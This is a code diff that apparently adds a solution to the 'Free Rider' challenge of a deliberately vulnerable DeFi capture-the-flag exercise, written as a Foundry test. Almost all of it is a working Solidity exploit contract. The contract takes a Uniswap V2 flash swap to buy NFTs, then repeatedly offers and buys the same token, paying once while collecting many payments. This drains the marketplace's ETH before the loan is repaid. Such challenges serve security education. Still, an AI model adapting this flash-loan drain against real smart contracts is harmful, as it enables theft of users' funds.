@@ -149,7 +149,11 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+	// idea: do flashswaps to buy the NFT, sell it, and then repay the loan
+	vm.startPrank(attacker, attacker); // NB: had to also get tx.origin!
+	Exploiter exp = new Exploiter(uniswapV2Pair, weth, freeRiderNFTMarketplace, freeRiderBuyer, damnValuableNFT);
+	exp.execute{value: 0.5 ether}();
+	vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -180,4 +184,81 @@ contract FreeRider is Test {
             MARKETPLACE_INITIAL_ETH_BALANCE
         );
     }
+}
+
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+contract Exploiter is IERC721Receiver {
+	IUniswapV2Pair pair;
+	WETH9 weth;
+	FreeRiderNFTMarketplace mp;
+	FreeRiderBuyer buyer;
+	DamnValuableNFT nft;
+	constructor(IUniswapV2Pair _pair, WETH9 _weth, FreeRiderNFTMarketplace _mp, FreeRiderBuyer _buyer, DamnValuableNFT _nft) {
+		pair = _pair;
+		weth = _weth;
+		mp = _mp;
+		buyer = _buyer;
+		nft = _nft;
+
+		nft.setApprovalForAll(address(mp), true);
+	}
+
+	function execute() public payable {
+		// to pay for swap fees
+		weth.deposit{value: msg.value}();
+
+		pair.swap(0, 100 ether, address(this), new bytes(1));
+
+		weth.withdraw(weth.balanceOf(address(this)));
+		payable(msg.sender).call{value: address(this).balance}("");
+	}
+
+	function uniswapV2Call(address sender, uint _dvt, uint wethAmount, bytes calldata data) external {
+		assert(sender == address(this)); // minimal safety
+
+		uint256[] memory buy = new uint256[](6);
+		for(uint8 i = 0; i < 6; ++i) {
+			buy[i] = i;
+		}
+		weth.withdraw(wethAmount);
+		mp.buyMany{value: 15 ether}(buy);
+
+		{ // exploit
+			uint steal = address(mp).balance;
+			uint8 len = 2;
+			uint256[] memory sellIdxs = new uint256[](len);
+			uint256[] memory sellValues = new uint256[](len);
+			for(uint8 i = 0; i < len; ++i) {
+				sellIdxs[i] = 0;
+				sellValues[i] = steal;
+			}
+
+			mp.offerMany(sellIdxs, sellValues);
+			// buy them back, but only pay once
+			// we paid for one but we buy 10, and each time we are paid 5 ether
+			mp.buyMany{value: steal}(sellIdxs);
+		}
+
+		for(uint8 i = 0; i < 6; ++i) {
+			nft.safeTransferFrom(address(this), address(buyer), i);
+		}
+
+		// we need to pay back in weth
+		uint payback = (wethAmount*1000/997) + 1;
+		weth.deposit{value: payback}();
+
+		// repay loan
+		weth.transfer(address(pair), payback);
+	}
+
+	function onERC721Received(
+		address,
+		address,
+		uint256 _tokenId,
+		bytes memory
+	) external override returns (bytes4) {
+		return IERC721Receiver.onERC721Received.selector;
+	}
+
+	receive() external payable {}
 }
